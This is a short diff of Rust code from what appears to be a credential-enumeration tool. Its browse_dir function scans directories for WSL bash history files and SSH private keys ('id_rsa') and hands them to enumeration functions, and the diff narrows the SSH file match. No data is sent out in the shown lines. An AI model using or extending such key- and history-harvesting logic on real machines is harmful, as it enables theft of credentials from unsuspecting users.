@@ -44,7 +44,7 @@ fn browse_dir() {
             println!("Fichier d'historique WSL trouve : {}", path);
             enum_bash_history((&path).to_string());
         }
-        if file.ends_with(".ssh") || file.ends_with("id_rsa")
+        if file.ends_with("id_rsa")
         {
             println!("Fichier ssh trouve : {}", path);
             enum_ssh_key((&path).to_string());
